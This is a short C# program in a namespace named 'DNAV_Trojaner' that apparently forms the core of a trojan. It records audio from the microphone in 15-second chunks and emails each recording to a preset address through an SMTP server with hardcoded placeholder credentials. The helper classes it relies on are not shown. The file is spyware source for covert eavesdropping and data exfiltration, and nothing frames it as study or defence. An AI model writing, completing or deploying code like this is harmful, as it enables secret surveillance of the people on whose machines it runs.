using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace DNAV_Trojaner {
    class Program {
        static public void tonaufnahme() {
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            int sec = 15;
            Audio.setPath("Test");
            Audio.Execution func = (path) => {
                Console.WriteLine("send: " + path);
                m.send("Neue Datei", "Eine neue Datei verfügbar:", path);
            };
            
            Audio.start(sec, func);
        }

        static void Main(string[] args) {
            tonaufnahme();
        }
    }
}
